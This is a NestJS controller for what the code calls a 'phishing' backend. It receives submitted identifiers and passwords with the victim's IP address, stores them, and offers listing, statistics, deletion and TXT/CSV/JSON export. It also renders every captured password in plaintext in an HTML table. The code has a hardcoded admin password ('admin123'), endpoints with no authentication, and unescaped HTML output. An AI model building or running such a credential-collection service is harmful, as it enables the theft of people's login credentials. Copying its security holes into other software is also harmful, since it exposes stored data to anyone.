import {
  Controller,
  Post,
  Get,
  Delete,
  Param,
  Body,
  Req,
  Res,
  HttpException,
  HttpStatus,
} from '@nestjs/common';
import type { Request, Response } from 'express';
import { PhishingService } from './phishing.service';
import { RegistrarIntentoDto } from './dto/registrar-intento.dto';

@Controller('phishing')
/**
 * Controlador HTTP para endpoints relacionados con registros de phishing.
 * Expone rutas para registrar, listar, exportar y eliminar registros.
 */
export class PhishingController {
  constructor(private readonly phishingService: PhishingService) {}

  private getRealIp(req: Request): string {
    const forwarded = req.headers['x-forwarded-for'] as string;
    if (forwarded) {
      return forwarded.split(',')[0];
    }
    return req.ip || req.socket.remoteAddress || 'unknown';
  }

  @Post('registrar')
  async registrar(@Body() data: RegistrarIntentoDto, @Req() req: Request) {
    try {
      const ipAddress = this.getRealIp(req);
      const registro = await this.phishingService.registrar(data, ipAddress);
      return {
        success: true,
        message: 'Datos registrados correctamente',
        id: registro.id,
      };
    } catch (error) {
      throw new HttpException(
        { error: error.message },
        HttpStatus.INTERNAL_SERVER_ERROR,
      );
    }
  }

  @Post('verify-admin')
  async verifyAdmin(@Body() body: { password: string }) {
    const ADMIN_PASSWORD = 'admin123';
    return { success: body.password === ADMIN_PASSWORD };
  }

  @Get('registros')
  async getRegistros() {
    return { registros: await this.phishingService.findAll() };
  }

  @Get('stats')
  async getStats() {
    return await this.phishingService.getStats();
  }

  @Delete('delete/:id')
  async deleteRegistro(@Param('id') id: string) {
    const success = await this.phishingService.delete(parseInt(id));
    return {
      success,
      mensaje: success ? `Registro ${id} eliminado` : 'Registro no encontrado',
    };
  }

  @Delete('delete-all')
  async deleteAllRegistros() {
    const eliminados = await this.phishingService.deleteAll();
    return { success: true, eliminados };
  }

  @Get('export/txt')
  async exportTxt(@Res() res: Response) {
    const content = await this.phishingService.exportToTXT();
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader(
      'Content-Disposition',
      `attachment; filename=phishing_registros_${new Date().toISOString().slice(0, 19)}.txt`,
    );
    res.send(content);
  }

  @Get('export/excel')
  async exportExcel(@Res() res: Response) {
    const csvPath = await this.phishingService.exportToCSV();
    res.download(
      csvPath,
      `phishing_registros_${new Date().toISOString().slice(0, 19)}.csv`,
    );
  }

  @Get('json')
  async getJson() {
    return this.phishingService.getRawJson();
  }

  @Get('download-json')
  async downloadJson(@Res() res: Response) {
    const jsonPath = this.phishingService.getJsonFilePath();
    res.download(
      jsonPath,
      `phishing_registros_${new Date().toISOString().slice(0, 19)}.json`,
    );
  }

  @Get('ver')
  async verRegistros(@Res() res: Response) {
    const registros = await this.phishingService.findAll();
    const stats = await this.phishingService.getStats();

    let html = `
      <!DOCTYPE html>
      <html>
      <head><title>Registros Phishing</title>
      <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #ff6b35; color: white; }
        .stats { background: white; padding: 15px; margin-bottom: 20px; border-radius: 8px; }
      </style>
      </head>
      <body>
        <h1>📊 Registros Phishing</h1>
        <div class="stats">
          <strong>Total registros: ${stats.total}</strong><br>
          <strong>Intentos: ${stats.intentos}</strong><br>
          <strong>Visitas: ${stats.visitas}</strong>
        </div>
        <a href="/carven2/admin">🔐 Ir al Panel Admin</a>
        <table border="1">
          <tr><th>ID</th><th>CH</th><th>Contraseña</th><th>IP</th><th>Fecha/Hora</th><th>Tipo</th></tr>
    `;
    for (const reg of registros) {
      html += `<tr><td>${reg.id}</td><td>${reg.ch}</td><td>${reg.password}</td><td>${reg.ipAddress}</td><td>${reg.fechaHora}</td><td>${reg.tipo}</td></tr>`;
    }
    html += `</table></body></html>`;
    res.send(html);
  }
}
